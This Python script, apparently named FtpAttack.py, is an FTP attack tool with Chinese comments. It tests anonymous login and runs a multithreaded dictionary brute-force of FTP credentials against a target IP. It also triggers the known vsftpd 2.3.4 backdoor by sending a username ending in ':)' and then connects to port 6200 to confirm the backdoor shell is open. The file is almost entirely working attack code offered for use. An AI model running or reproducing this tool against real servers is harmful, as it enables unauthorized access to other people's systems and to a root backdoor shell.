import ftplib
from optparse import OptionParser
import time
import threading
from queue import Queue
import sys
import socket as s

# 进行匿名登录
def anonLogin(target,port):
    try:
        ftp = ftplib.FTP()
        ftp.connect(target,port)
        ftp.login('anonymous'.strip(),'abcd'.strip())
        print('[+] %s:%d : anonymous login successful'%(target,port))
        ftp.quit()
    except :
        print('[-] %s:%d : anonymous login failed'%(target,port))

# 进行爆破登录
def blastLogin(target,port,file):
    global flag # 标志是否爆破成功

    # 多线程爆破
    class thread(threading.Thread):
        def __init__(self,queue,total):
            threading.Thread.__init__(self)
            self.queue = queue
            self.total = total

        def run(self):
            global flag
            while not self.queue.empty():
                user = self.queue.get()
                threading.Thread(target=self.progress_bar())
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(target,port)
                    ftp.login(user.split(' ')[0].strip(),user.split(' ')[-1].strip())
                    sys.stdout.write('\r'+' '*50)
                    sys.stdout.write('\r[+] %s:%d : %s %s login successful\n'%(target,port,user.split(' ')[0].strip(),user.split(' ')[-1].strip()))
                    sys.stdout.flush()
                    flag = True
                    ftp.quit()
                except:
                    pass

        def progress_bar(self):
            sys.stdout.write('\r'+' '*50)
            per = 100-float(self.queue.qsize())/float(self.total)*100
            msg = '%s Left [%s All] Scan in %1.1f%%'%(self.queue.qsize(),self.total,per)
            sys.stdout.write('\r'+'[#]'+msg)
            sys.stdout.flush()
    
    # 得到用于爆破的用户名和密码
    try:
        f = open(file,'r')
        users = f.readlines()
        f.close()
    except Exception as e:
        print(e)
        exit()

    queue = Queue()

    for user in users:
        user.strip('\n')
        queue.put(user)

    total = queue.qsize()
    threads = []
    threadnum = 10 # 线程数

    for _ in range(threadnum):
        threads.append(thread(queue,total))
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    # 未爆破成功
    if not flag:
        print('[-] %s:%s : Blasting login failed'%(target,port))

# 检测是否存在vsftpd_234漏洞
def vsftpd_234(target,port):
    try:
        ftp = ftplib.FTP()
        ftp.connect(target,port,timeout=5)
        ftp.login('user:)'.strip(),'pass'.strip())
        ftp.quit()
    except:
        print('[*] use user:) to open the backdoor')
    
    try:
        tcpClient = s.socket(s.AF_INET,s.SOCK_STREAM)
        tcpClient.connect((target,6200))
        tcpClient.close()
        print('[+] vsftpd_234_backdoor exists')
    except Exception as e:
        print(e)
        print('[-] vsftpd_234_backdoor does not exist')


if __name__ == "__main__":
    print("""
 /$$$$$$$$ /$$                /$$$$$$    /$$     /$$                         /$$      
| $$_____/| $$               /$$__  $$  | $$    | $$                        | $$      
| $$     /$$$$$$    /$$$$$$ | $$  \\ $$ /$$$$$$ /$$$$$$    /$$$$$$   /$$$$$$$| $$   /$$
| $$$$$ |_  $$_/   /$$__  $$| $$$$$$$$|_  $$_/|_  $$_/   |____  $$ /$$_____/| $$  /$$/
| $$__/   | $$    | $$  \\ $$| $$__  $$  | $$    | $$      /$$$$$$$| $$      | $$$$$$/ 
| $$      | $$ /$$| $$  | $$| $$  | $$  | $$ /$$| $$ /$$ /$$__  $$| $$      | $$_  $$ 
| $$      |  $$$$/| $$$$$$$/| $$  | $$  |  $$$$/|  $$$$/|  $$$$$$$|  $$$$$$$| $$ \\  $$
|__/       \\___/  | $$____/ |__/  |__/   \\___/   \\___/   \\_______/ \\_______/|__/  \\__/
                  | $$                                                                
                  | $$                                                                
                  |__/                                                                
                  
                   /$$                       /$$                                      
                  | $$                      | $$                                      
                  | $$$$$$$  /$$   /$$      | $$   /$$ /$$   /$$                      
                  | $$__  $$| $$  | $$      | $$  |__/|  $$ /$$/                      
                  | $$  \\ $$| $$  | $$      | $$   /$$ \\  $$$$/                       
                  | $$  | $$| $$  | $$      | $$  | $$  >$$  $$                       
                  | $$$$$$$/|  $$$$$$$      | $$  | $$ /$$/\\  $$                      
                  |_______/  \\____  $$      |__/  | $$|__/  \\__/                      
                             /$$  | $$       /$$  | $$                                
                            |  $$$$$$/      |  $$$$$$/                                
                             \\______/        \\______/                                 
    """)
    # 设置命令行参数
    parse = OptionParser()
    parse.add_option('-t','--target',dest='target',help='The target ip')
    parse.add_option('-p','--port',dest='port',default=21,type='int',help='The ftp port')
    parse.add_option('-f','--file',dest='file',help='The name and passwd file')
    (options,args) = parse.parse_args()
    if options.target:
        print('[*] Try anonymous login')
        anonLogin(options.target,options.port)
        print('\n[*] Test the vsftpd_234_backdoor')
        vsftpd_234(options.target,options.port)
        if options.file:
            flag = False
            print('\n[*] Try to blast login')
            blastLogin(options.target,options.port,options.file)
        else:
            print('\n[-] No dictionary, does not try blast login')
    else:
        parse.print_help()
        print('\nExample:')
        print('[#]-> python FtpAttack.py -t 127.0.0.1')
        print('[#]-> python FtpAttack.py -t 127.0.0.1 -p 26')
        print('[#]-> python FtpAttack.py -t 127.0.0.1 -f ftp.txt')